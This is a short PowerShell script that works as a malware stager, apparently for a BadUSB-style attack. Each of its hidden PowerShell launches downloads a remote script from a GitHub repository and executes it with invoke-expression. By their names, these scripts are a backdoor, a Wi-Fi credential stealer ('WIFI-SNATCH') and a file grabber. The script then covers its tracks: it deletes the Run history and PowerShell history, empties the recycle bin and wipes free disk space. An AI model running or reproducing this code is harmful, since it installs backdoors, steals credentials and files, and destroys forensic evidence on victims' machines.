rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

cmd -Argument '/c start /min "" powershell -windowstyle hidden $backdoor = iwr https://github.com/skekic16/lol/raw/main/BPC.ps1?dl=1; invoke-expression $backdoor'
start-sleep 20
cmd -Argument '/c start /min "" powershell -windowstyle hidden $px = iwr https://github.com/skekic16/lol/raw/main/DP.ps1?dl=1; invoke-expression $px'
cmd -Argument '/c start /min "" powershell -windowstyle hidden $pw = iwr https://github.com/skekic16/lol/raw/main/files.ps1?dl=1; invoke-expression $pw'
cmd -Argument '/c start /min "" powershell -windowstyle hidden $pg = iwr https://github.com/skekic16/lol/raw/main/WIFI-SNATCH.ps1?dl=1; invoke-expression $pg'
cmd -Argument '/c start /min "" powershell -windowstyle hidden $task2 = iwr https://github.com/skekic16/lol/raw/main/task2.ps1?dl=1; invoke-expression $task2'

start-sleep 50

function Clean-Exfil { 

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}
Clean-Exfil
cmd -Argument '/c start /min "" powershell -windowstyle hidden cipher /w:c'
Remove-Item (Get-PSreadlineOption).HistorySavePath
cls
exit
